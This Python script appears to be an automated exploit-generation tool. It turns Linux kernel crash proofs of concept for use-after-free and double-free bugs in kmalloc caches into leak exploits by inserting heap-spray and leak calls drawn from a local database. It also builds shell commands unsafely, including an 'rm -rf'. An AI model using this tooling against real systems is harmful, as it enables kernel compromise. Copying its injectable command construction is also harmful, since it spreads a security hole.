from sys import exit
from argparse import *
import subprocess
import os
import sys
import time
import re

def split_code(code):
    loop = ""
    main = ""
    
    header = code.split("int main")[0]

    main = code.split("int main")[1].split("\n{\n")[1].split("\n}\n")[0].replace("\r", "")
    if args.close_fds == True:
        main += "\nclose(3);\nclose(4);\n"

    return main, header

def find_db(obj, cache, avail):
    if obj == "indirect":
        path = os.path.join(os.environ['PROJECT_HOME'], "db", "indirect")
        with open(os.path.join(path, "db.txt")) as f:
            data = f.read()
            for line in data.split("\n"):
                if cache in line:
                    area = int(line.split("Area : ")[1].split(",")[0])
                    if area in avail:
                        return os.path.join(path, line.split("file : ")[1])
    elif obj == "direct":
        path = os.path.join(os.environ['PROJECT_HOME'], "db", "direct")
        with open(os.path.join(path, "db.txt")) as f:
            data = f.read()
            for line in data.split("\n"):
                if cache in line:
                    area_h = int(line.split("Area : ")[1].split(",")[0].split("-")[0])
                    area_t = int(line.split("Area : ")[1].split(",")[0].split("-")[1])
                    if int(avail) == -1:
                        return os.path.join(path, line.split("file : ")[1])
                    if int(avail) >= area_h and int(avail) < area_t:
                        return os.path.join(path, line.split("file : ")[1])
    elif obj == "ptr":
        path = os.path.join(os.environ['PROJECT_HOME'], "db", "ptr")
        with open(os.path.join(path, "db.txt")) as f:
            data = f.read()
            for line in data.split("\n"):
                if cache in line:
                    return os.path.join(path, line.split("file : ")[1])

def ex_uaf_w(zone, alloc, free, crash, avail, spray):
    print("[+] Exploit Use-After-Free Write")
    OO = open(args.ca).read().split("OO : ")[1].split("\n")[0]
    code = open(args.poc).read()
    # split code to header, main
    main, header = split_code(code)

    leakdir = os.path.join(workdir, "leak")
    if os.path.isdir(leakdir):
        os.system("rm -rf " + leakdir)
    os.mkdir(leakdir)

    header_file = os.path.join(workdir, "leak", "header.h")
    with open(header_file, "w") as f:
        f.write(header)

    print("[=] output path : " + os.path.join(workdir, "leak"))
    poc_file = os.path.join(workdir, "leak", "poc.c")
    with open(poc_file, "w") as f:
        cache = zone.split("kmalloc-")[1]
        f.write("#include \"header.h\"\n")
        f.write("#include \"leak_" + cache + ".h\"\n")
        if int(spray) > 0:
            f.write("#include \"spray_" + cache + ".h\"\n")
            tmp = os.path.join(os.environ['PROJECT_HOME'], "db", "spray", "spray_" + cache + ".h")
            os.system("cp " + tmp + " " + leakdir)

        tmp = find_db(OO, cache, avail)
        #tmp = os.path.join(os.environ['PROJECT_HOME'], "db", "leak", "leak_" + cache + ".h")
        os.system("cp " + tmp + " " + leakdir)

        f.write("int main()\n{\n")
        f.write("\n\t// Initialize \n")
        f.write("\tleak_init();\n")
        f.write("\t// Initialize End\n\n")
        if int(spray) > 0:
            f.write("\tspray_init();\n")

        f.write("\n\t// Body\n")
        for line in main.split("\n"):
            line = line.strip()

            if free in line:
                f.write("\t" + line + "\n")
                if int(spray) > 0:
                    f.write("\tspray(" + spray + ");\n")
                f.write("\tleak_alloc();\n")
            elif crash in line:
                f.write("\t" + line + "\n")
                f.write("\tleak();\n")
                f.write("\tleak_dump();\n")
            elif "return" in line:
                continue
            else:
                f.write("\t" + line + "\n")
        f.write("\n}\n")

def ex_uaf_r(zone, alloc, free, crash, avail, spray):
    print("[+] Exploit Use-After-Free Read")
    OO = open(args.ca).read().split("OO : ")[1].split("\n")[0]
    code = open(args.poc).read()
    # split code to header, main
    main, header = split_code(code)

    leakdir = os.path.join(workdir, "leak")
    if os.path.isdir(leakdir):
        os.system("rm -rf " + leakdir)
    os.mkdir(leakdir)

    header_file = os.path.join(workdir, "leak", "header.h")
    with open(header_file, "w") as f:
        f.write(header)

    print("[=] output path : " + os.path.join(workdir, "leak"))
    poc_file = os.path.join(workdir, "leak", "poc.c")
    with open(poc_file, "w") as f:
        cache = zone.split("kmalloc-")[1]
        f.write("#include \"header.h\"\n")
        f.write("#include \"leak_" + cache + ".h\"\n")
        if int(spray) > 0:
            f.write("#include \"spray_" + cache + ".h\"\n")
            tmp = os.path.join(os.environ['PROJECT_HOME'], "db", "spray", "spray_" + cache + ".h")
            os.system("cp " + tmp + " " + leakdir)

        tmp = find_db(OO, cache, avail)
        #tmp = os.path.join(os.environ['PROJECT_HOME'], "db", "leak", "leak_" + cache + ".h")
        os.system("cp " + tmp + " " + leakdir)

        f.write("int main()\n{\n")
        f.write("\n\t// Initialize \n")
        f.write("\tleak_init();\n")
        f.write("\t// Initialize End\n\n")
        if int(spray) > 0:
            f.write("\tspray_init();\n")

        f.write("\n\t// Body\n")
        for line in main.split("\n"):
            line = line.strip()

            if free in line:
                f.write("\t" + line + "\n")
                if int(spray) > 0:
                    f.write("\tspray(" + spray + ");\n")
                f.write("\tleak_alloc();\n")
            elif crash in line:
                f.write("\t" + line + "\n")
            elif "return" in line:
                continue
            else:
                f.write("\t" + line + "\n")
        f.write("\n}\n")

def ex_df(zone, alloc, free, d_free, spray):
    OO = open(args.ca).read().split("OO : ")[1].split("\n")[0]
    OO2 = open(args.ca).read().split("OO2 : ")[1].split("\n")[0]

    code = open(args.poc).read()
    main, header = split_code(code)
    cache = zone.split("kmalloc-")[1]

    ripdir = os.path.join(workdir, "leak")
    if not os.path.isdir(ripdir):
        os.mkdir(ripdir)

    header_file = os.path.join(workdir, "leak", "header.h")
    with open(header_file, "w") as f:
        f.write(header)

    print("[=] output path : " + os.path.join(workdir, "leak"))
    poc_file = os.path.join(workdir, "leak", "poc.c")
    with open(poc_file, "w") as f:
        f.write("#include \"header.h\"\n")
        f.write("#include \"kmalloc_" + cache + ".h\"\n")
        f.write("#include \"leak_" + cache + ".h\"\n")
        if int(spray) > 0:
            f.write("#include \"spray_" + cache + ".h\"\n")
            tmp = os.path.join(os.environ['PROJECT_HOME'], "db", "spray", "spray_" + cache + ".h")
            os.system("cp " + tmp + " " + ripdir)

        tmp = find_db(OO, cache, "-1")
        # tmp = os.path.join(os.environ['PROJECT_HOME'], "db", "leak", "leak_" + cache + ".h")
        os.system("cp " + tmp + " " + ripdir)
        tmp = find_db(OO2, cache, "-1")
        # tmp = os.path.join(os.environ['PROJECT_HOME'], "db", "dp", "kmalloc_" + cache + ".h")
        os.system("cp " + tmp + " " + ripdir)

        f.write("int main()\n{\n")
        f.write("\n\t// Body\n")
        f.write("\n\t// Initialize\n")
        f.write("\tkmalloc_init();\n")
        f.write("\tleak_init();\n")
        if int(spray) > 0:
            f.write("\tspray_init();\n")
        f.write("\t// Initialize end\n\n")

        for line in main.split("\n"):
            line = line.strip()
            if free in line and free != d_free:
                f.write("\t" + line + "\n")
                f.write("\tleak_alloc();\n")
            elif d_free in line:
                f.write("\t" + line + "\n")
                if int(spray) > 0:
                    f.write("\tspray(" + spray + ");\n")
                if free == d_free:
                    f.write("\tleak_alloc();\n")
                f.write("\tkmalloc_alloc();\n")
                f.write("\tleak();\n")
                f.write("\tleak_dump();\n")
            elif "return" in line:
                continue
            else:
                f.write("\t" + line + "\n")
        f.write("\n}\n")

def exploit():
    # Read availability log
    if not os.path.isfile(args.ci):
        print("[-] input the log")
        sys.exit(1)
    data = open(args.ci).read()

    crash_type = ""
    zone = ""
    alloc_syscall =  ""
    free_syscall = ""
    d_free_syscall = ""
    crash_syscall = ""
    availability = []
    spray = ""

    # Parse availability log
    for line in data.split("\n"):
        if "CRASH TYPE : " in line:
            crash_type = line.split("CRASH TYPE : ")[1].replace("\r", "")
        if "CRASH ZONE : " in line:
            zone =  line.split("ZONE : ")[1].replace("\r", "")
        if "ALLOC SYSCALL : " in line:
            alloc_syscall = line.split("ALLOC SYSCALL : ")[1].replace("\r", "")
        if "FREE SYSCALL : " in line:
            free_syscall = line.split("FREE SYSCALL : ")[1].replace("\r", "")
        if "DOUBLE FREE SYSCALL : " in line:
            d_free_syscall = line.split("DOUBLE FREE SYSCALL : ")[1].replace("\r", "")
        if "AVAILABILITY : " in line:
            availability.append(line.split("AVAILABILITY : ")[1])
        if "CRASH SYSCALL : " in line:
            crash_syscall = line.split("CRASH SYSCALL : ")[1].replace("\r", "")
        if "SPRAY : " in line:
            spray = line.split("SPRAY : ")[1]

    print("[+] TYPE : " +crash_type)
    print("[+] ZONE  : " + zone)
    print("[+] ALLOC : " + alloc_syscall)
    print("[+] FREE : " + free_syscall)
    if d_free_syscall != "":
        print("[+] DFREE : " + d_free_syscall)
    else:
        print("[+] CRASH : " + crash_syscall)
    print("[+] AVAILABILITY : ", availability)
    print("[+] SPRAY : " + spray)

    if not "kmalloc" in zone:
        print("[-] NOT KMALLOC ZONE")
        sys.exit(1)

    if crash_type == "WP" or crash_type == "WV":
        ex_uaf_w(zone, alloc_syscall, free_syscall, crash_syscall, availability, spray)
    elif crash_type == "RP" or crash_type == "RV":
        ex_uaf_r(zone, alloc_syscall, free_syscall, crash_syscall, availability, spray)
    elif crash_type == "DF":
        ex_df(zone, alloc_syscall, free_syscall, d_free_syscall, spray)

if __name__ == "__main__":

    parser = ArgumentParser("description")
    parser.add_argument("--poc", required=True)
    parser.add_argument("--ci", required=True)
    parser.add_argument("--ca", required=True)
    parser.add_argument("--workdir", required=False, default=os.path.join(os.environ['PROJECT_HOME'], "exploit_tmp"))
    parser.add_argument("--close_fds", required=False, default=True)

    global args
    args = parser.parse_args()

    global workdir
    workdir = args.workdir
    if not os.path.isdir(workdir):
        os.mkdir(workdir)
    
    exploit()
